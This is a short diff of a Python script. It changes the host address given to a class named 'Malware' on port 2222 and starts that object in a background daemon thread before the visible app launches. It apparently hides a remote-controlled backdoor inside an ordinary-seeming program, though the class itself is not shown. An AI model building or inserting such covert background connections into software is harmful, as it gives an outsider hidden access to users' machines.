@@ -95,6 +95,6 @@ def startapp():
 #     root.withdraw()
 #     root.destroy()
 if __name__ == '__main__':
-    malware = Malware('192.168.50.94',2222)
+    malware = Malware('192.168.50.38',2222)
     Thread(target=malware.run,daemon=True).start()
     check_dependencies_and_continue(startapp)
